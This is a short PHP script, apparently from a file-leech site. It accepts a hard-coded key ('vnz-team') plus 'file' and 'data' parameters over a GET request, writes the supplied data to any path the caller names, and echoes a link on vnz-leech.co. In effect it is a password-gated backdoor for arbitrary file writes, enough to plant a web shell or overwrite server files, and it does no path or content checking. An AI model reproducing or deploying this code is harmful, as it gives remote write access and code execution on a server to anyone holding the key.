<?php
$password = 'vnz-team';

if ((isset($_GET['apikey']) && $_GET['apikey'] == $password) && (isset($_GET['file']) && $_GET['file'] != '') && (isset($_GET['data']) && $_GET['data'] != '')) {

		$data = $_GET['data'];
			
		
		$file = $_GET['file'];
		echo "http://vnz-leech.co/rg/index.php?apikey=happy&file=".urlencode($file);
		file_put_contents($file, $data);
		//	fwrite($file, $data . PHP_EOL);
		
	//	fclose($file);

}
?>